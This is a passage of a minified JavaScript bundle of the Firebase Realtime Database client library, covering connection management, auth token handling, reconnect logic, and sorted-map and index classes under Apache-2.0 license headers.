S3(t,e){t.parts_.length>0&&(t.byteLength_+=1),t.parts_.push(e),t.byteLength_+=Sh(e),hT(t)}function b3(t){const e=t.parts_.pop();t.byteLength_-=Sh(e),t.parts_.length>0&&(t.byteLength_-=1)}function hT(t){if(t.byteLength_>xx)throw new Error(t.errorPrefix_+"has a key path longer than "+xx+" bytes ("+t.byteLength_+").");if(t.parts_.length>wx)throw new Error(t.errorPrefix_+"path specified exceeds the maximum depth that can be written ("+wx+") or object contains a cycle "+ls(t))}function ls(t){return t.parts_.length===0?"":"in property '"+t.parts_.join(".")+"'"}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class qv extends uT{static getInstance(){return new qv}constructor(){super(["visible"]);let e,n;typeof document<"u"&&typeof document.addEventListener<"u"&&(typeof document.hidden<"u"?(n="visibilitychange",e="hidden"):typeof document.mozHidden<"u"?(n="mozvisibilitychange",e="mozHidden"):typeof document.msHidden<"u"?(n="msvisibilitychange",e="msHidden"):typeof document.webkitHidden<"u"&&(n="webkitvisibilitychange",e="webkitHidden")),this.visible_=!0,n&&document.addEventListener(n,()=>{const r=!document[e];r!==this.visible_&&(this.visible_=r,this.trigger("visible",r))},!1)}getInitialEvent(e){return B(e==="visible","Unknown event type: "+e),[this.visible_]}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Va=1e3,T3=60*5*1e3,Ex=30*1e3,I3=1.3,N3=3e4,k3="server_kill",Cx=3;class br extends cT{constructor(e,n,r,i,s,o,a,c){if(super(),this.repoInfo_=e,this.applicationId_=n,this.onDataUpdate_=r,this.onConnectStatus_=i,this.onServerInfoUpdate_=s,this.authTokenProvider_=o,this.appCheckTokenProvider_=a,this.authOverride_=c,this.id=br.nextPersistentConnectionId_++,this.log_=xc("p:"+this.id+":"),this.interruptReasons_={},this.listens=new Map,this.outstandingPuts_=[],this.outstandingGets_=[],this.outstandingPutCount_=0,this.outstandingGetCount_=0,this.onDisconnectRequestQueue_=[],this.connected_=!1,this.reconnectDelay_=Va,this.maxReconnectDelay_=T3,this.securityDebugCallback_=null,this.lastSessionId=null,this.establishConnectionTimer_=null,this.visible_=!1,this.requestCBHash_={},this.requestNumber_=0,this.realtime_=null,this.authToken_=null,this.appCheckToken_=null,this.forceTokenRefresh_=!1,this.invalidAuthTokenCount_=0,this.invalidAppCheckTokenCount_=0,this.firstConnection_=!0,this.lastConnectionAttemptTime_=null,this.lastConnectionEstablishedTime_=null,c&&!G1())throw new Error("Auth override specified in options, but not supported on non Node.js platforms");qv.getInstance().on("visible",this.onVisible_,this),e.host.indexOf("fblocal")===-1&&Md.getInstance().on("online",this.onOnline_,this)}sendRequest(e,n,r){const i=++this.requestNumber_,s={r:i,a:e,b:n};this.log_(tt(s)),B(this.connected_,"sendRequest call when we're not connected not allowed."),this.realtime_.sendRequest(s),r&&(this.requestCBHash_[i]=r)}get(e){this.initConnection_();const n=new dc,i={action:"g",request:{p:e._path.toString(),q:e._queryObject},onComplete:o=>{const a=o.d;o.s==="ok"?n.resolve(a):n.reject(a)}};this.outstandingGets_.push(i),this.outstandingGetCount_++;const s=this.outstandingGets_.length-1;return this.connected_&&this.sendGet_(s),n.promise}listen(e,n,r,i){this.initConnection_();const s=e._queryIdentifier,o=e._path.toString();this.log_("Listen called for "+o+" "+s),this.listens.has(o)||this.listens.set(o,new Map),B(e._queryParams.isDefault()||!e._queryParams.loadsAllData(),"listen() called for non-default but complete query"),B(!this.listens.get(o).has(s),"listen() called twice for same path/queryId.");const a={onComplete:i,hashFn:n,query:e,tag:r};this.listens.get(o).set(s,a),this.connected_&&this.sendListen_(a)}sendGet_(e){const n=this.outstandingGets_[e];this.sendRequest("g",n.request,r=>{delete this.outstandingGets_[e],this.outstandingGetCount_--,this.outstandingGetCount_===0&&(this.outstandingGets_=[]),n.onComplete&&n.onComplete(r)})}sendListen_(e){const n=e.query,r=n._path.toString(),i=n._queryIdentifier;this.log_("Listen on "+r+" for "+i);const s={p:r},o="q";e.tag&&(s.q=n._queryObject,s.t=e.tag),s.h=e.hashFn(),this.sendRequest(o,s,a=>{const c=a.d,u=a.s;br.warnOnListenWarnings_(c,n),(this.listens.get(r)&&this.listens.get(r).get(i))===e&&(this.log_("listen response",a),u!=="ok"&&this.removeListen_(r,i),e.onComplete&&e.onComplete(u,c))})}static warnOnListenWarnings_(e,n){if(e&&typeof e=="object"&&or(e,"w")){const r=Uo(e,"w");if(Array.isArray(r)&&~r.indexOf("no_index")){const i='".indexOn": "'+n._queryParams.getIndex().toString()+'"',s=n._path.toString();At(`Using an unspecified index. Your data will be downloaded and filtered on the client. Consider adding ${i} at ${s} to your security rules for better performance.`)}}}refreshAuthToken(e){this.authToken_=e,this.log_("Auth token refreshed"),this.authToken_?this.tryAuth():this.connected_&&this.sendRequest("unauth",{},()=>{}),this.reduceReconnectDelayIfAdminCredential_(e)}reduceReconnectDelayIfAdminCredential_(e){(e&&e.length===40||aj(e))&&(this.log_("Admin auth credential detected.  Reducing max reconnect time."),this.maxReconnectDelay_=Ex)}refreshAppCheckToken(e){this.appCheckToken_=e,this.log_("App check token refreshed"),this.appCheckToken_?this.tryAppCheck():this.connected_&&this.sendRequest("unappeck",{},()=>{})}tryAuth(){if(this.connected_&&this.authToken_){const e=this.authToken_,n=oj(e)?"auth":"gauth",r={cred:e};this.authOverride_===null?r.noauth=!0:typeof this.authOverride_=="object"&&(r.authvar=this.authOverride_),this.sendRequest(n,r,i=>{const s=i.s,o=i.d||"error";this.authToken_===e&&(s==="ok"?this.invalidAuthTokenCount_=0:this.onAuthRevoked_(s,o))})}}tryAppCheck(){this.connected_&&this.appCheckToken_&&this.sendRequest("appcheck",{token:this.appCheckToken_},e=>{const n=e.s,r=e.d||"error";n==="ok"?this.invalidAppCheckTokenCount_=0:this.onAppCheckRevoked_(n,r)})}unlisten(e,n){const r=e._path.toString(),i=e._queryIdentifier;this.log_("Unlisten called for "+r+" "+i),B(e._queryParams.isDefault()||!e._queryParams.loadsAllData(),"unlisten() called for non-default but complete query"),this.removeListen_(r,i)&&this.connected_&&this.sendUnlisten_(r,i,e._queryObject,n)}sendUnlisten_(e,n,r,i){this.log_("Unlisten on "+e+" for "+n);const s={p:e},o="n";i&&(s.q=r,s.t=i),this.sendRequest(o,s)}onDisconnectPut(e,n,r){this.initConnection_(),this.connected_?this.sendOnDisconnect_("o",e,n,r):this.onDisconnectRequestQueue_.push({pathString:e,action:"o",data:n,onComplete:r})}onDisconnectMerge(e,n,r){this.initConnection_(),this.connected_?this.sendOnDisconnect_("om",e,n,r):this.onDisconnectRequestQueue_.push({pathString:e,action:"om",data:n,onComplete:r})}onDisconnectCancel(e,n){this.initConnection_(),this.connected_?this.sendOnDisconnect_("oc",e,null,n):this.onDisconnectRequestQueue_.push({pathString:e,action:"oc",data:null,onComplete:n})}sendOnDisconnect_(e,n,r,i){const s={p:n,d:r};this.log_("onDisconnect "+e,s),this.sendRequest(e,s,o=>{i&&setTimeout(()=>{i(o.s,o.d)},Math.floor(0))})}put(e,n,r,i){this.putInternal("p",e,n,r,i)}merge(e,n,r,i){this.putInternal("m",e,n,r,i)}putInternal(e,n,r,i,s){this.initConnection_();const o={p:n,d:r};s!==void 0&&(o.h=s),this.outstandingPuts_.push({action:e,request:o,onComplete:i}),this.outstandingPutCount_++;const a=this.outstandingPuts_.length-1;this.connected_?this.sendPut_(a):this.log_("Buffering put: "+n)}sendPut_(e){const n=this.outstandingPuts_[e].action,r=this.outstandingPuts_[e].request,i=this.outstandingPuts_[e].onComplete;this.outstandingPuts_[e].queued=this.connected_,this.sendRequest(n,r,s=>{this.log_(n+" response",s),delete this.outstandingPuts_[e],this.outstandingPutCount_--,this.outstandingPutCount_===0&&(this.outstandingPuts_=[]),i&&i(s.s,s.d)})}reportStats(e){if(this.connected_){const n={c:e};this.log_("reportStats",n),this.sendRequest("s",n,r=>{if(r.s!=="ok"){const s=r.d;this.log_("reportStats","Error sending stats: "+s)}})}}onDataMessage_(e){if("r"in e){this.log_("from server: "+tt(e));const n=e.r,r=this.requestCBHash_[n];r&&(delete this.requestCBHash_[n],r(e.b))}else{if("error"in e)throw"A server-side error has occurred: "+e.error;"a"in e&&this.onDataPush_(e.a,e.b)}}onDataPush_(e,n){this.log_("handleServerMessage",e,n),e==="d"?this.onDataUpdate_(n.p,n.d,!1,n.t):e==="m"?this.onDataUpdate_(n.p,n.d,!0,n.t):e==="c"?this.onListenRevoked_(n.p,n.q):e==="ac"?this.onAuthRevoked_(n.s,n.d):e==="apc"?this.onAppCheckRevoked_(n.s,n.d):e==="sd"?this.onSecurityDebugPacket_(n):Vm("Unrecognized action received from server: "+tt(e)+`
Are you using the latest client?`)}onReady_(e,n){this.log_("connection ready"),this.connected_=!0,this.lastConnectionEstablishedTime_=new Date().getTime(),this.handleTimestamp_(e),this.lastSessionId=n,this.firstConnection_&&this.sendConnectStats_(),this.restoreState_(),this.firstConnection_=!1,this.onConnectStatus_(!0)}scheduleConnect_(e){B(!this.realtime_,"Scheduling a connect when we're already connected/ing?"),this.establishConnectionTimer_&&clearTimeout(this.establishConnectionTimer_),this.establishConnectionTimer_=setTimeout(()=>{this.establishConnectionTimer_=null,this.establishConnection_()},Math.floor(e))}initConnection_(){!this.realtime_&&this.firstConnection_&&this.scheduleConnect_(0)}onVisible_(e){e&&!this.visible_&&this.reconnectDelay_===this.maxReconnectDelay_&&(this.log_("Window became visible.  Reducing delay."),this.reconnectDelay_=Va,this.realtime_||this.scheduleConnect_(0)),this.visible_=e}onOnline_(e){e?(this.log_("Browser went online."),this.reconnectDelay_=Va,this.realtime_||this.scheduleConnect_(0)):(this.log_("Browser went offline.  Killing connection."),this.realtime_&&this.realtime_.close())}onRealtimeDisconnect_(){if(this.log_("data client disconnected"),this.connected_=!1,this.realtime_=null,this.cancelSentTransactions_(),this.requestCBHash_={},this.shouldReconnect_()){this.visible_?this.lastConnectionEstablishedTime_&&(new Date().getTime()-this.lastConnectionEstablishedTime_>N3&&(this.reconnectDelay_=Va),this.lastConnectionEstablishedTime_=null):(this.log_("Window isn't visible.  Delaying reconnect."),this.reconnectDelay_=this.maxReconnectDelay_,this.lastConnectionAttemptTime_=new Date().getTime());const e=Math.max(0,new Date().getTime()-this.lastConnectionAttemptTime_);let n=Math.max(0,this.reconnectDelay_-e);n=Math.random()*n,this.log_("Trying to reconnect in "+n+"ms"),this.scheduleConnect_(n),this.reconnectDelay_=Math.min(this.maxReconnectDelay_,this.reconnectDelay_*I3)}this.onConnectStatus_(!1)}async establishConnection_(){if(this.shouldReconnect_()){this.log_("Making a connection attempt"),this.lastConnectionAttemptTime_=new Date().getTime(),this.lastConnectionEstablishedTime_=null;const e=this.onDataMessage_.bind(this),n=this.onReady_.bind(this),r=this.onRealtimeDisconnect_.bind(this),i=this.id+":"+br.nextConnectionId_++,s=this.lastSessionId;let o=!1,a=null;const c=function(){a?a.close():(o=!0,r())},u=function(f){B(a,"sendRequest call when we're not connected not allowed."),a.sendRequest(f)};this.realtime_={close:c,sendRequest:u};const p=this.forceTokenRefresh_;this.forceTokenRefresh_=!1;try{const[f,h]=await Promise.all([this.authTokenProvider_.getToken(p),this.appCheckTokenProvider_.getToken(p)]);o?ct("getToken() completed but was canceled"):(ct("getToken() completed. Creating connection."),this.authToken_=f&&f.accessToken,this.appCheckToken_=h&&h.token,a=new w3(i,this.repoInfo_,this.applicationId_,this.appCheckToken_,this.authToken_,e,n,r,E=>{At(E+" ("+this.repoInfo_.toString()+")"),this.interrupt(k3)},s))}catch(f){this.log_("Failed to get token: "+f),o||(this.repoInfo_.nodeAdmin&&At(f),c())}}}interrupt(e){ct("Interrupting connection for reason: "+e),this.interruptReasons_[e]=!0,this.realtime_?this.realtime_.close():(this.establishConnectionTimer_&&(clearTimeout(this.establishConnectionTimer_),this.establishConnectionTimer_=null),this.connected_&&this.onRealtimeDisconnect_())}resume(e){ct("Resuming connection for reason: "+e),delete this.interruptReasons_[e],Am(this.interruptReasons_)&&(this.reconnectDelay_=Va,this.realtime_||this.scheduleConnect_(0))}handleTimestamp_(e){const n=e-new Date().getTime();this.onServerInfoUpdate_({serverTimeOffset:n})}cancelSentTransactions_(){for(let e=0;e<this.outstandingPuts_.length;e++){const n=this.outstandingPuts_[e];n&&"h"in n.request&&n.queued&&(n.onComplete&&n.onComplete("disconnect"),delete this.outstandingPuts_[e],this.outstandingPutCount_--)}this.outstandingPutCount_===0&&(this.outstandingPuts_=[])}onListenRevoked_(e,n){let r;n?r=n.map(s=>Bv(s)).join("$"):r="default";const i=this.removeListen_(e,r);i&&i.onComplete&&i.onComplete("permission_denied")}removeListen_(e,n){const r=new Se(e).toString();let i;if(this.listens.has(r)){const s=this.listens.get(r);i=s.get(n),s.delete(n),s.size===0&&this.listens.delete(r)}else i=void 0;return i}onAuthRevoked_(e,n){ct("Auth token revoked: "+e+"/"+n),this.authToken_=null,this.forceTokenRefresh_=!0,this.realtime_.close(),(e==="invalid_token"||e==="permission_denied")&&(this.invalidAuthTokenCount_++,this.invalidAuthTokenCount_>=Cx&&(this.reconnectDelay_=Ex,this.authTokenProvider_.notifyForInvalidToken()))}onAppCheckRevoked_(e,n){ct("App check token revoked: "+e+"/"+n),this.appCheckToken_=null,this.forceTokenRefresh_=!0,(e==="invalid_token"||e==="permission_denied")&&(this.invalidAppCheckTokenCount_++,this.invalidAppCheckTokenCount_>=Cx&&this.appCheckTokenProvider_.notifyForInvalidToken())}onSecurityDebugPacket_(e){this.securityDebugCallback_?this.securityDebugCallback_(e):"msg"in e&&console.log("FIREBASE: "+e.msg.replace(`
`,`
FIREBASE: `))}restoreState_(){this.tryAuth(),this.tryAppCheck();for(const e of this.listens.values())for(const n of e.values())this.sendListen_(n);for(let e=0;e<this.outstandingPuts_.length;e++)this.outstandingPuts_[e]&&this.sendPut_(e);for(;this.onDisconnectRequestQueue_.length;){const e=this.onDisconnectRequestQueue_.shift();this.sendOnDisconnect_(e.action,e.pathString,e.data,e.onComplete)}for(let e=0;e<this.outstandingGets_.length;e++)this.outstandingGets_[e]&&this.sendGet_(e)}sendConnectStats_(){const e={};let n="js";e["sdk."+n+"."+Bb.replace(/\./g,"-")]=1,Nv()?e["framework.cordova"]=1:K1()&&(e["framework.reactnative"]=1),this.reportStats(e)}shouldReconnect_(){const e=Md.getInstance().currentlyOnline();return Am(this.interruptReasons_)&&e}}br.nextPersistentConnectionId_=0;br.nextConnectionId_=0;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class le{constructor(e,n){this.name=e,this.node=n}static Wrap(e,n){return new le(e,n)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Ph=class{getCompare(){return this.compare.bind(this)}indexedValueChanged(e,n){const r=new le(zo,e),i=new le(zo,n);return this.compare(r,i)!==0}minPost(){return le.MIN}};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let fu;class fT extends Ph{static get __EMPTY_NODE(){return fu}static set __EMPTY_NODE(e){fu=e}compare(e,n){return Ms(e.name,n.name)}isDefinedOn(e){throw na("KeyIndex.isDefinedOn not expected to be called.")}indexedValueChanged(e,n){return!1}minPost(){return le.MIN}maxPost(){return new le(Is,fu)}makePost(e,n){return B(typeof e=="string","KeyIndex indexValue must always be a string."),new le(e,fu)}toString(){return".key"}}const _o=new fT;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class pu{constructor(e,n,r,i,s=null){this.isReverse_=i,this.resultGenerator_=s,this.nodeStack_=[];let o=1;for(;!e.isEmpty();)if(e=e,o=n?r(e.key,n):1,i&&(o*=-1),o<0)this.isReverse_?e=e.left:e=e.right;else if(o===0){this.nodeStack_.push(e);break}else this.nodeStack_.push(e),this.isReverse_?e=e.right:e=e.left}getNext(){if(this.nodeStack_.length===0)return null;let e=this.nodeStack_.pop(),n;if(this.resultGenerator_?n=this.resultGenerator_(e.key,e.value):n={key:e.key,value:e.value},this.isReverse_)for(e=e.left;!e.isEmpty();)this.nodeStack_.push(e),e=e.right;else for(e=e.right;!e.isEmpty();)this.nodeStack_.push(e),e=e.left;return n}hasNext(){return this.nodeStack_.length>0}peek(){if(this.nodeStack_.length===0)return null;const e=this.nodeStack_[this.nodeStack_.length-1];return this.resultGenerator_?this.resultGenerator_(e.key,e.value):{key:e.key,value:e.value}}}class st{constructor(e,n,r,i,s){this.key=e,this.value=n,this.color=r??st.RED,this.left=i??Vt.EMPTY_NODE,this.right=s??Vt.EMPTY_NODE}copy(e,n,r,i,s){return new st(e??this.key,n??this.value,r??this.color,i??this.left,s??this.right)}count(){return this.left.count()+1+this.right.count()}isEmpty(){return!1}inorderTraversal(e){return this.left.inorderTraversal(e)||!!e(this.key,this.value)||this.right.inorderTraversal(e)}reverseTraversal(e){return this.right.reverseTraversal(e)||e(this.key,this.value)||this.left.reverseTraversal(e)}min_(){return this.left.isEmpty()?this:this.left.min_()}minKey(){return this.min_().key}maxKey(){return this.right.isEmpty()?this.key:this.right.maxKey()}insert(e,n,r){let i=this;const s=r(e,i.key);return s<0?i=i.copy(null,null,null,i.left.insert(e,n,r),null):s===0?i=i.copy(null,n,null,null,null):i=i.copy(null,null,null,null,i.right.insert(e,n,r)),i.fixUp_()}removeMin_(){if(this.left.isEmpty())return Vt.EMPTY_NODE;let e=this;return!e.left.isRed_()&&!e.left.left.isRed_()&&(e=e.moveRedLeft_()),e=e.copy(null,null,null,e.left.removeMin_(),null),e.fixUp_()}remove(e,n){let r,i;if(r=this,n(e,r.key)<0)!r.left.isEmpty()&&!r.left.isRed_()&&!r.left.left.isRed_()&&(r=r.moveRedLeft_()),r=r.copy(null,null,null,r.left.remove(e,n),null);else{if(r.left.isRed_()&&(r=r.rotateRight_()),!r.right.isEmpty()&&!r.right.isRed_()&&!r.right.left.isRed_()&&(r=r.moveRedRight_()),n(e,r.key)===0){if(r.right.isEmpty())return Vt.EMPTY_NODE;i=r.right.min_(),r=r.copy(i.key,i.value,null,null,r.right.removeMin_())}r=r.copy(null,null,null,null,r.right.remove(e,n))}return r.fixUp_()}isRed_(){return this.color}fixUp_(){let e=this;return e.right.isRed_()&&!e.left.isRed_()&&(e=e.rotateLeft_()),e.left.isRed_()&&e.left.left.isRed_()&&(e=e.rotateRight_()),e.left.isRed_()&&e.right.isRed_()&&(e=e.colorFlip_()),e}moveRedLeft_(){let e=this.colorFlip_();return e.right.left.isRed_()&&(e=e.copy(null,null,null,null,e.right.rotateRight_()),e=e.rotateLeft_(),e=e.colorFlip_()),e}moveRedRight_(){let e=this.colorFlip_();return e.left.left.isRed_()&&(e=e.rotateRight_(),e=e.colorFlip_()),e}rotateLeft_(){const e=this.copy(null,null,st.RED,null,this.right.left);return this.right.copy(null,null,this.color,e,null)}rotateRight_(){const e=this.copy(null,null,st.RED,this.left.right,null);return this.left.copy(null,null,this.color,null,e)}colorFlip_(){const e=this.left.copy(null,null,!this.left.color,null,null),n=this.right.copy(null,null,!this.right.color,null,null);return this.copy(null,null,!this.color,e,n)}checkMaxDepth_(){const e=this.check_();return Math.pow(2,e)<=this.count()+1}check_(){if(this.isRed_()&&this.left.isRed_())throw new Error("Red node has red child("+this.key+","+this.value+")");if(this.right.isRed_())throw new Error("Right child of ("+this.key+","+this.value+") is red");const e=this.left.check_();if(e!==this.right.check_())throw new Error("Black depths differ");return e+(this.isRed_()?0:1)}}st.RED=!0;st.BLACK=!1;class P3{copy(e,n,r,i,s){return this}insert(e,n,r){return new st(e,n,null)}remove(e,n){return this}count(){return 0}isEmpty(){return!0}inorderTraversal(e){return!1}reverseTraversal(e){return!1}minKey(){return null}maxKey(){return null}check_(){return 0}isRed_(){return!1}}class Vt{constructor(e,n=Vt.EMPTY_NODE){this.comparator_=e,this.root_=n}insert(e,n){return new Vt(this.comparator_,this.root_.insert(e,n,this.comparator_).copy(null,null,st.BLACK,null,null))}remove(e){return new Vt(this.comparator_,this.root_.remove(e,this.comparator_).copy(null,null,st.BLACK,null,null))}get(e){let n,r=this.root_;for(;!r.isEmpty();){if(n=this.comparator_(e,r.key),n===0)return r.value;n<0?r=r.left:n>0&&(r=r.right)}return null}getPredecessorKey(e){let n,r=this.root_,i=null;for(;!r.isEmpty();)if(n=this.comparator_(e,r.key),n===0){if(r.left.isEmpty())return i?i.key:null;for(r=r.left;!r.right.isEmpty();)r=r.right;return r.key}else n<0?r=r.left:n>0&&(i=r,r=r.right);throw new Error("Attempted to find predecessor key for a nonexistent key.  What gives?")}isEmpty(){return this.root_.isEmpty()}count(){return this.root_.count()}minKey(){return this.root_.minKey()}maxKey(){return this.root_.maxKey()}inorderTraversal(e){return this.root_.inorderTraversal(e)}reverseTraversal(e){return this.root_.reverseTraversal(e)}getIterator(e){return new pu(this.root_,null,this.comparator_,!1,e)}getIteratorFrom(e,n){return new pu(this.root_,e,this.comparator_,!1,n)}getReverseIteratorFrom(e,n){return new pu(this.root_,e,this.comparator_,!0,n)}getReverseIterator(e){return new pu(this.root_,null,this.comparator_,!0,e)}}Vt.EMPTY_NODE=new P3;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function R3(t,e){return Ms(t.name,e.name)}function Yv(t,e){return Ms(t,e)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Wm;function A3(t){Wm=t}const pT=function(t){return typeof t=="number"?"number:"+Kb(t):"string:"+t},mT=function(t){if(t.isLeafNode()){const e=t.val();B(typeof e=="string"||typeof e=="number"||typeof e=="object"&&or(e,".sv"),"Priority must be a string or number.")}else B(t===Wm||t.isEmpty(),"priority of unexpected type.");B(t===Wm||t.getPriority().isEmpty(),"Priority nodes can't have a priority of their own.")};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Sx;class rt{static set __childrenNodeConstructor(e){Sx=e}static get __childrenNodeConstructor(){return Sx}constructor(e,n=rt.__childrenNodeConstructor.EMPTY_NODE){this.value_=e,this.priorityNode_=n,this.lazyHash_=null,B(this.value_!==void 0&&this.value_!==null,"LeafNode shouldn't be created with null/undefined value."),mT(this.priorityNode_)}isLeafNode(){return!0}getPriority(){return this.priorityNode_}updatePriority(e){return new rt(this.value_,e)}getImmediateChild(e){return e===".priority"?this.priorityNode_:rt.__childrenNodeConstructor.EMPTY_NODE}getChild(e){return ce(e)?this:ae(e)===".priority"?this.priorityNode_:rt.__childrenNodeConstructor.EMPTY_NODE}hasChild(){return!1}getPredecessorChildName(e,n){return null}updateImmediateChild(e,n){return e===".priority"?this.updatePriority(n):n.isEmpty()&&e!==".priority"?this:rt.__childrenNodeConstructor.EMPTY_NODE.updateImmediateChild(e,n).updatePriority(this.priorityNode_)}updateChild(e,n){const r=ae(e);return r===null?n:n.isEmpty()&&r!==".priority"?this:(B(r!==".priority"||Fi(e)===1,".priority must be the last token in a path"),this.updateImmediateChild(r,rt.__childrenNodeConstructor.EMPTY_NODE.updateChild(ke(e),n)))}isEmpty(){return!1}numChildren(){return 0}forEachChild(e,n){return!1}val(e){return e&&!this.getPriority().isEmpty()?{".value":this.getValue(),".priority":this.getPriority().val()}:this.getValue()}hash(){if(this.lazyHash_===null){let e="";this.priorityNode_.isEmpty()||(e+="priority:"+pT(this.priorityNode_.val())+":");const n=typeof this.value_;e+=n+":",n==="number"?e+=Kb(this.value_):e+=this.value_,this.lazyHash_=Hb(e)}return this.lazyHash_}getValue(){return this.value_}compareTo(e){return e===rt.__childrenNodeConstructor.EMPTY_NODE?1:e instanceof rt.__childrenNodeConstructor?-1:(B(e.isLeafNode(),"Unknown node type"),this.compareToLeafNode_(e))}compareToLeafNode_(e){const n=typeof e.value_,r=typeof this.value_,i=rt.VALUE_TYPE_ORDER.indexOf(n),s=rt.VALUE_TYPE_ORDER.indexOf(r);return B(i>=0,"Unknown leaf type: "+n),B(s>=0,"Unknown leaf type: "+r),i===s?r==="object"?0:this.value_<e.value_?-1:this.value_===e.value_?0:1:s-i}withIndex(){return this}isIndexed(){return!0}equals(e){if(e===this)return!0;if(e.isLeafNode()){const n=e;return this.value_===n.value_&&this.priorityNode_.equals(n.priorityNode_)}else return!1}}rt.VALUE_TYPE_ORDER=["object","boolean","number","string"];/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let gT,vT;function O3(t){gT=t}function D3(t){vT=t}class j3 extends Ph{compare(e,n){const r=e.node.getPriority(),i=n.node.getPriority(),s=r.compareTo(i);return s===0?Ms(e.name,n.name):s}isDefinedOn(e){return!e.getPriority().isEmpty()}indexedValueChanged(e,n){return!e.getPriority().equals(n.getPriority())}minPost(){return le.MIN}maxPost(){return new le(Is,new rt("[PRIORITY-POST]",vT))}makePost(e,n){const r=gT(e);return new le(n,new rt("[PRIORITY-POST]",r))}toString(){return".priority"}}const He=new j3;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
